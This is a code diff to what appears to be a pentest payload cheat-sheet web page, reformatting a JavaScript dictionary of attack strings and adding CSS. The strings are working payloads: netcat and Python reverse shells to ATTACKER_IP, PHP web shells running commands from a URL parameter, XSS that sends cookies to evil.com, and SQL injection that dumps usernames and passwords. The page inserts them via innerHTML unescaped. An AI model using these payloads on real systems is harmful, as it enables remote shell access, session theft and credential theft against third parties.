@@ -36,6 +36,8 @@
             border-radius: 5px;
             margin-top: 10px;
             white-space: pre-wrap;
+            word-break: break-word;
+            text-align: left;
         }
     </style>
 </head>
@@ -53,13 +55,23 @@
     <script>
         function showPayload(type) {
             let payloads = {
-                "Netcat Reverse Shell": "nc -e /bin/sh ATTACKER_IP PORT\nnc.exe -e cmd.exe ATTACKER_IP PORT",
-                "PHP RCE": "<?php system($_GET['cmd']); ?>\n<?php eval($_GET['cmd']); ?>",
-                "Python Reverse Shell": "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ATTACKER_IP',PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);",
-                "XSS Payloads": "\"><script>alert(1)</script>\n\"><script>document.location='http://evil.com/steal.php?c='+document.cookie</script>",
-                "SQL Injection": "' OR '1'='1' -- \n' UNION SELECT username,password FROM users -- "
+                "Netcat Reverse Shell": `nc -e /bin/sh ATTACKER_IP PORT
+nc.exe -e cmd.exe ATTACKER_IP PORT`,
+                "PHP RCE": `<?php system($_GET['cmd']); ?>
+<?php eval($_GET['cmd']); ?>`,
+                "Python Reverse Shell": `import socket,subprocess,os;
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(('ATTACKER_IP',PORT));
+os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);
+p=subprocess.call(['/bin/sh','-i']);`,
+                "XSS Payloads": `"><script>alert(1)</script>
+\"><script>document.location='http://evil.com/steal.php?c='+document.cookie</script>`,
+                "SQL Injection": `"' OR '1'='1' -- 
+' UNION SELECT username,password FROM users -- "`
             };
-            document.getElementById("payload-container").innerHTML = "<div class='payload-box'>" + payloads[type] + "</div>";
+            document.getElementById("payload-container").innerHTML = `<div class='payload-box'><pre>${payloads[type]}</pre></div>`;
         }
     </script>
 </body>
